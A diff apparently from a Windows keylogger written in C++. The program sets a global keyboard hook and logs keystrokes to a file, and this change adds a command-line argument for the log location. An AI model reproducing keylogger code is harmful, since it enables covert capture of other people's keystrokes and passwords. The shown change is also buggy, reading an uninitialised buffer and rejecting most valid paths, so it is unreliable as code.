@@ -8,13 +8,14 @@
 HANDLE _loggingFile;
 
 LRESULT WINAPI KeyboardProc(int, WPARAM, LPARAM);
-HANDLE CreateNewLoggingFile();
+HANDLE CreateNewLoggingFile(std::string);
 void WriteToLoggingFile(std::string, HANDLE);
 HHOOK KeyboardHook;
 
 int main(int argc, char* argv[])
 {
-	_loggingFile = CreateNewLoggingFile();
+	_loggingFile = CreateNewLoggingFile(argv[1]);
+		
 	if (_loggingFile == INVALID_HANDLE_VALUE)
 	{
 		std::cout << "Could not get file handle error: " << GetLastError() << std::endl;
@@ -43,13 +44,25 @@ int main(int argc, char* argv[])
     return 0;
 }
 
-HANDLE CreateNewLoggingFile()
+HANDLE CreateNewLoggingFile(std::string fileLocation)
 {
+	std::string fileString;
 	TCHAR buffer[BUFSIZE];
-	GetCurrentDirectory(BUFSIZE, buffer);
-	std::wstring wstr = buffer;
-
-	const std::string fileString = (std::string(wstr.begin(), wstr.end()) + "\\log.txt");
+	std::string fileName = "log.txt";
+	
+	if (	fileLocation.empty() ||
+			fileLocation.length() > MAX_PATH ||
+			fileLocation.find_first_of("\\/:*?\"<>|") != std::string::npos)
+	{
+		std::wstring wstr = buffer;
+		GetCurrentDirectory(BUFSIZE, buffer);
+		fileString = (std::string(wstr.begin(), wstr.end()) + "\\" + fileName);
+	}
+	else
+	{
+		fileString = fileLocation + "\\" + fileName;
+	}
+	
 	const LPCSTR file_name = fileString.c_str();
 
 	return CreateFileA(
